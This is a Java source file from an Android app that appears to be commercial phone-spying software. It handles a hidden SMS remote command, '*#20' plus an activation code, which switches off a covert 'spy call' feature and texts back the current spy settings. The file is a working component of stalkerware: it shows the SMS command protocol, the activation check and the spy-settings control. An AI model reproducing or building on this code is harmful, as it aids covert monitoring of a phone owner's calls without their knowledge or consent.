package com.fx.dalvik.smscommand.interpreter;

import android.content.Context;
import android.os.SystemClock;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;

public class SmsDisableSpyCall {

	private static final String TAG = "SmsDisableSpyCall";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#20";
	
	// Disable Spy call command
	// <*#20><FK>
	public static String processCommand(Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Set disable spy call
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		spyInfoManager.setEnabled(false);

		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" +
				SmsCommandHelper.getSpyCallSettings(context, true, true);
	}
}
